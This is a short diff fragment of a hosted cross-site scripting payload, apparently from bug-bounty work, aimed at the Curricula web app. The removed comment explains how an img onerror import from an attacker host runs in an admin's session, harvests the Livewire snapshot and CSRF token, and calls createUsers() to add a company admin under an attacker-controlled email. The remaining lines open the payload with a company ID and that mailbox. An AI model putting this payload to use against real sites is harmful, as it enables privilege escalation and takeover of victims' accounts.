@@ -1,13 +1,3 @@
-/* Hosted XSS payload — Curricula CREATE a new team member (admin) via Livewire
- * component `company.http.livewire.admins`.
- * Load with:  <img src=x onerror=import('//YOUR_HOST/p-create')>   (serve with Access-Control-Allow-Origin: *)
- * Runs in the victim admin's session; replays the real 2-request flow on /company/{COMPANY}/admins:
- *   1) GET the page              -> harvest the admins-component snapshot + CSRF
- *   2) POST /livewire/update     -> set newAdminEmails.0 + newAdminRole (the "type email" step)
- *   3) POST /livewire/update     -> call createUsers()  => new company-admin + setup email to attacker addr
- * Snapshots are chained (each response carries a fresh server-signed checksum); the snapshot is
- * passed back verbatim and the only mutation goes through `updates`, so the checksum stays valid.
- */
 (async () => {
   const COMPANY = 81523;
   const EMAIL   = 'floerer+xss-newadmin@intigriti.me';   // attacker-controlled mailbox -> setup link -> full company-admin access
